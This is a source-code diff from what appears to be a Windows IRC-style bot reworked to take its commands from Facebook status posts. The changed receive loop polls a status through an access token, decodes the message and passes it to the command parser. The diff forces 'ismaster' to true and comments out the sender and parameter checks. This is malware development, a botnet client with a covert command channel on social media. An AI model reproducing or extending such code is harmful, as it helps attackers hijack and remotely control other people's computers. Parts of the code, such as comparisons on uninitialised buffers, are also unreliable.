@@ -273,7 +273,7 @@ int fb_receiveloop()
 	
 	// main receive buffer
 	char buffer[4096];
-	char temp[500];
+	char *temp;
 	int numberOfLoop = 0;
 	char masters[MAXLOGINS][128], *lines[MAX_LINES], str[18], login[128], host[160];
 	int i, j, repeat, in_channel=0;
@@ -293,7 +293,6 @@ int fb_receiveloop()
 		string paramField ="?fields=message&limit=1";
 		FbStatus f = GetFBStatuses(paramId,paramField,paramAccesstoken);
 	
-	
 		memset(buffer, 0, sizeof(buffer));
 		// if recv() returns 0, that means that the connection has been lost.
 		//if (frecv(sock, buffer, sizeof(buffer), 0) <= 0) 
@@ -301,13 +300,12 @@ int fb_receiveloop()
 		Sleep(5000);
 		char s[200];
 		if(f.message != NULL){
-			DecodeMessage(f.message,decodeMessage);
-			printf("3. FB status : %s\n",f.message);
-			printf("3. FB status : %s\n",decodeMessage.c_str());
-			String2Char(decodeMessage,temp);
-			if(strcmp(s,temp)!=0){
-				strcpy(buffer,temp);
-				strcpy(s,temp);
+			
+			printf("3. FB status : %s\n",f.message);	
+			if(strcmp(s,f.message)!=0){
+				strcpy(buffer,f.message);
+				//printf("%s\n",buffer);
+				strcpy(s,f.message);
 
 			}
 			else {
@@ -323,7 +321,21 @@ int fb_receiveloop()
 		// FIX ME: Truncation occurs here
 		// split lines up if multiple lines received at once, and parse each line	
 		//printf("%s\n",buffer);
+		//printf("before split\n");
+		//while(1){}
+
 		i = Split(buffer,&lines);
+		//printf("%s\n",lines[0]);
+		/*
+		int t= i;
+		for(int k = 0 ; k<t; k++)
+		{
+			printf("Line %d : %s\n",k,lines[k]);
+		}
+		*/
+
+		//while(1){}
+
 		printf("i = split  i = %d \n",i);
 		for (j=0;j < i;j++) {
 			repeat=1;
@@ -332,19 +344,33 @@ int fb_receiveloop()
 				#ifdef DEBUG_LOGGING
 				debuglog(lines[j]);
 				#endif
-<<<<<<< HEAD
-				//lines[j]=strcat(command_prefix,lines[j]); // thêm cái nùi đó vô đây ra được format như cũ
-=======
 				
-				// dự định là giải mã đoạn lines[j] lấy về ở đây: lines[j] = decode(lines[j])
-				lines[j]=strcat(command_prefix,lines[j]); // thêm cái nùi đó vô đây ra được format như cũ
->>>>>>> origin/master
+
 				//if(lines[j][0]!=0)
-					printf("Line %d: %s\n",j,lines[j]);
+				//DebugChar();
+				printf("Line %d: %s\n",j,lines[j]);
+				//DebugChar();
+				DecodeMessage(lines[j],decodeMessage);
+				//printf("\nDecode Message: %s\n",decodeMessage.c_str());
+				//DebugChar();
+				//Sleep(3000);
+				temp = String2CharPointer(decodeMessage);
+				printf("pointer char : %s\n",temp);
+				//Sleep(3000);
+				//repeat = fb_parseline(temp,repeat);
+				//printf("stop here\n");
 				
-				repeat = fb_parseline(lines[j],repeat);
+				try{
+				//repeat = fb_parseline(lines[j],repeat);
+				repeat = fb_parseline(temp,repeat);
 				printf(" do while repeat  = %d\n",repeat);
 				repeat--;
+				free(temp);
+				}
+				catch(std::exception e)
+				{
+					while(1){}
+				}
 
 				if (repeat > 0)
 					Sleep(FLOOD_DELAY);
@@ -373,7 +399,7 @@ int fb_parseline(char *line,int repeat)
 	char line1[IRCLINE], line2[IRCLINE], sendbuf[IRCLINE],ntmp[12], ntmp2[3];
 	char *a[MAXTOKENS], a0[128], nick[MAXNICKLEN], user[24];
 	unsigned char parameters[256];
-	printf("IRC parseline\n");
+	printf("5 ----IRC parseline\n");
 	int i, ii, s=3;
 	DWORD id=0;
 	BOOL ismaster = TRUE, silent = TRUE, notice = FALSE, usevars = FALSE;
@@ -381,10 +407,10 @@ int fb_parseline(char *line,int repeat)
 	memset(sendbuf, 0, sizeof(sendbuf));
 
 	if (line == NULL) return 1;
-	printf("%s\n",line);
+	//printf("%s\n",line);
 	memset(line1, 0, sizeof(line1));
 	strncpy(line1, line, sizeof(line1)-1);
-	printf("%s\n",line1);
+	printf("Line 1:  %s\n",line1);
 	char *x = strstr(line1, " :");
 	//printf("%x\n",x);
 	
@@ -405,42 +431,43 @@ int fb_parseline(char *line,int repeat)
 
 	memset(parameters,0,sizeof(parameters));
 	//printf("checking parameter-----\n");
-	for (i=31;i>=0;i--) {
-		if (!a[i]){ 
-			//printf("2. a[%d] :  %s\n",i,a[i]);
-			continue;
-		}
-		if ((a[i][0]=='-') && (a[i][2]==0)) {
-			//Looks like a valid parameter..
-			if(a[i]!= NULL)
-			printf("2. a[%d][0] :  %s\n",i,a[i]);
-			parameters[a[i][1]]=1;
-			a[i][0]=0;
-			a[i][1]=0;
-			a[i][2]=0;
-			a[i]=NULL;
-		} else 
-			break;
-	}
+	//for (i=31;i>=0;i--) {
+	//	if (!a[i]){ 
+	//		//printf("2. a[%d] :  %s\n",i,a[i]);
+	//		continue;
+	//	}
+	//	if ((a[i][0]=='-') && (a[i][2]==0)) {
+	//		//Looks like a valid parameter..
+	//		if(a[i]!= NULL)
+	//		printf("2. a[%d][0] :  %s\n",i,a[i]);
+	//		parameters[a[i][1]]=1;
+	//		a[i][0]=0;
+	//		a[i][1]=0;
+	//		a[i][2]=0;
+	//		a[i]=NULL;
+	//	} else 
+	//		break;
+	//}
 
-	if (parameters['s']) 
-		silent=TRUE;
-	if (parameters['n']) {
-		silent=FALSE;
-		notice=TRUE;
-	}
+	//if (parameters['s']) 
+	//	silent=TRUE;
+	//if (parameters['n']) {
+	//	silent=FALSE;
+	//	notice=TRUE;
+	//}
 
-	if (a[0][0] != '\n') {
-		strncpy(a0,  a[0], sizeof(a0)-1);
-		strncpy(user, a[0]+1, sizeof(user)-1);
-		strtok(user, "!");
-	}
+	//if (a[0][0] != '\n') {
+	//	strncpy(a0,  a[0], sizeof(a0)-1);
+	//	strncpy(user, a[0]+1, sizeof(user)-1);
+	//	strtok(user, "!");
+	//}
 
 
 	// if we get a privmsg, notice or topic command, start parsing it
-	printf("3. Start to analyse private message---\n");
-	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
-		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
+	
+	if (strcmp("pmsg", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
+		printf("3. Start to analyse private message---\n");
+		if (strcmp("pmsg", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
 			if (strcmp("NOTICE", a[1]) == 0) 
 				notice = TRUE;
 			if (a[2] == NULL) return 1;
@@ -591,11 +618,12 @@ int fb_parseline(char *line,int repeat)
 			}
 			return 1;
 		}
-		printf("4. Start TODO task\n");
+		
 		ismaster = true;
 		int spy=0;
 		
 		if ((ismaster || strcmp("332", a[1]) == 0) && spy == 0) {
+			printf("4. Start TODO task\n");
 			// commands requiring no parameters
 			// check if the command matches an alias's name
 			for (i = 0; i < anum; i++) {
@@ -636,7 +664,7 @@ int fb_parseline(char *line,int repeat)
 			}
 
 
-
+			printf(" s = %d\n",s);
 			if (strcmp("die", a[s]) == 0 || strcmp("d", a[s]) == 0) {
 				if (strcmp("332", a[1]) != 0) {
 					#ifdef DEBUG_LOGGING
